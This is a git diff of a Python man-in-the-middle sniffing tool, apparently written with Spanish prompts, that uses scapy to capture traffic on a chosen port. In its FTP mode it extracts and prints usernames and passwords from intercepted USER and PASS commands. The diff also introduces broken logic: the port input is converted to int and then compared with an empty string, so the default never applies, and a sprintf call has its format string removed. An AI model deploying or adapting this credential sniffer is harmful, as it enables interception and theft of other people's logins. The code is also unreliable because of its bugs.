@@ -67,17 +67,19 @@ class MITM():
             capture.summary()
 
         elif method == 'port':
-            port = input(f"{W}Puerto : {O}")
+            port = int(input(f"{W}Puerto : {O}"))
             print(f"{G}[INFO] {W} Escuchando en el puerto {port}...")
-            capture = sniff(filter='port %s' % (port))
+            #capture = sniff(filter='port %s' % (port))
             def r(packet):
                 if packet[TCP].dport == port:
-                    data = packet.sprintf("%Raw.load%")
+                    data = packet.sprintf()
                     print(data)
             capture = sniff(filter="port %s" % (port),iface=iface, prn=r)
             capture.summary()
         elif method == 'ftp':
-            ftp_port = input(f"{G}Puerto de ftp >> {W}")
+            ftp_port = int(input(f"{G}Puerto de ftp (default: 21)>> {W}"))
+            if ftp_port == '':
+                ftp_port = 21
             print(f"{G}[INFO] {W} Escuchando protocolos de FTP ...")
             def r(packet):
                 if packet[TCP].dport == ftp_port:
@@ -86,14 +88,14 @@ class MITM():
                         print(f"{G} Conexión desde {packet[IP].src} <--> {packet[IP].dst}")
                         data = data.split(" ")
                         data = data[1]
-                        print(f"{G} Posible usuario -> {data}")
+                        print(f"{W} Posible usuario {G}-> {P}{data}")
                     elif "PASS" in data:
                         data = data.split(" ")
                         data = data[1]
-                        print(f"{G} Posible contraseña -> {data}")
+                        print(f"{W} Posible contraseña {G}-> {P}{data}")
             if iface:
-                capture = sniff(filter="port %s" % (ftp_port),iface=iface, prn=r)
                 print(f"{O}[SET] {W} Interfaz -> {iface}")
+                capture = sniff(filter="port %s" % (ftp_port),iface=iface, prn=r)
             else:
                 capture = sniff(filter="port %s" % (ftp_port), prn=r)
             capture.summary()
